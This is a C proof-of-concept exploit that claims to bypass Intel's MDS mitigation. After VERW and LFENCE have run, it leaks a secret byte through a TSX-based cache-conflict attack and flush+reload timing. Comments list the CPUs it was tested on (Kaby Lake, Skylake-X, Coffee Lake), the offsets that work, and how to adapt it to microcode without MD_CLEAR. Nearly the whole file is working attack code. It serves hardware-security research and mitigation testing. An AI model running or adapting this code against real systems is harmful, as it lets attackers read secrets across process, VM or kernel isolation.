#include <inttypes.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/mman.h>

/*
  MDS mitigation bypass..?

  <write secret to separate page>
  <verw+lfence>
  <flush cache lines which are not secret>
  <TSX-cache-conflict leak>
  --> leaks secret

  store forward mitigation doesn't help
    - you can also use different offsets, e.g. victim 84 and read 20
  byte-based PoC, only works for offsets 16-31 and 48-55, not going to debug this now
  you MUST be running microcode with MD_CLEAR set
    - otherwise replace verw with clflush or reads/writes instead, see existing PoCs
  tested on Kaby Lake (up to 0xb4), Skylake-X, Coffee Lake Refresh step 0xC
*/

#ifndef VICTIM_OFFSET
#define VICTIM_OFFSET 20 /* write secret to this offset */
#endif
#ifndef READ_OFFSET
#define READ_OFFSET 20 /* leak from this offset */
#endif

#ifndef SECRET_VALUE
#define SECRET_VALUE 0x42 /* Pick your own super secret value. */
#endif

#define ITERS 10000

uint64_t check_MD_CLEAR() {
	uint64_t out;
	asm volatile("cpuid\n" : "=d" (out) : "a"(0x7), "c"(0x0): "rbx");
	return !!(out & (1 << 10));
}

static inline __attribute__((always_inline)) uint64_t rdtscp(void) {
	uint64_t lo, hi;
	asm volatile("rdtscp\n" : "=a" (lo), "=d" (hi) :: "rcx");
	return (hi << 32) | lo;
}

int main(int argc, char *argv[]) {
	__attribute__((aligned(4096))) size_t results[256] = {0};
	size_t k, x;

	/* reloadbuffer is what we'll use for the flush/reload, at a stride of 1024. */
	unsigned char *reloadbuffer = mmap(NULL, 4096 + (256 * 1024), PROT_READ | PROT_WRITE,
		MAP_ANONYMOUS | MAP_PRIVATE | MAP_POPULATE, -1, 0);

	/* we leak via this memory */
	volatile unsigned char *leak = mmap(NULL, 4096*48, PROT_READ | PROT_WRITE,
		MAP_ANONYMOUS | MAP_PRIVATE | MAP_POPULATE, -1, 0);

	/* secret store */
	volatile unsigned char *privatebuf = mmap(NULL, 4096*48, PROT_READ | PROT_WRITE,
		MAP_ANONYMOUS | MAP_PRIVATE | MAP_POPULATE, -1, 0);

	/* push addresses a couple of cache lines out, to reduce noise. */
	reloadbuffer = reloadbuffer + 0x80;

#ifdef PRINT_ADDRS
	printf("storing secret @ %p\n", privatebuf+VICTIM_OFFSET);
	printf("leak buffer    @ %p\n", leak + READ_OFFSET);
	printf("reload buffer  @ %p\n", reloadbuffer);
#endif
	printf("MD_CLEAR is %d\n", (int)check_MD_CLEAR());

	for (size_t i = 0; i < ITERS; ++i) {
		/* Put a secret into L1 cache. It's okay, it's private. */
		*(volatile unsigned int *)(privatebuf+VICTIM_OFFSET) = SECRET_VALUE;

		/* apply recommended mitigation */
		asm volatile(
			"sub $8, %rsp\n"
			"mov %ds, (%rsp)\n"
			"verw (%rsp)\n"
			"add $8, %rsp\n"
			"lfence\n"
			);

#ifndef NO_OVERWRITE
		// OPTIONAL: overwrite the secret, to be sure it is gone
		*(volatile unsigned int *)(privatebuf+VICTIM_OFFSET) = 0x0;
#endif

		/* flush reloadbuffer */
		for (k = 0; k < 256; ++k) {
			x = ((k * 167) + 13) & (0xff);
			asm volatile("clflush (%0)\n"::"r"(reloadbuffer + x * 1024));
		}
		asm volatile("mfence\n"); // optional

		/* the turtle leaks */
		asm volatile(
		"clflush (%0)\n"
		"sfence\n"
		"clflush (%1)\n"
		"xbegin abortpoint\n"
		"movzbq (%0), %%rax\n"
		"shl $0xa, %%rax\n"
#ifdef NO_SSE
		"movzbq (%%rax, %1), %%rax\n"
#else
		"movntdqa (%%rax, %1), %%xmm0\n"
#endif
		"xend\n"
		"abortpoint:\n"
		"mfence\n"
		::"r"(leak + READ_OFFSET), "r"(reloadbuffer):"rax"
		);

		/* reload */
		for (size_t k = 0; k < 256; ++k) {
			x = ((k * 167) + 13) & (0xff);

			unsigned char *p = reloadbuffer + (1024 * x);

			uint64_t t0 = rdtscp();
			*(volatile unsigned char *)p;
			uint64_t dt = rdtscp() - t0;

			if (dt < 160) results[x]++;
		}
	}

	for (size_t c = 0; c < 256; ++c) {
		if (results[c] > ITERS/1000)
			printf("%8zu: 0x%02x\n", results[c], (int)c);
	}
}

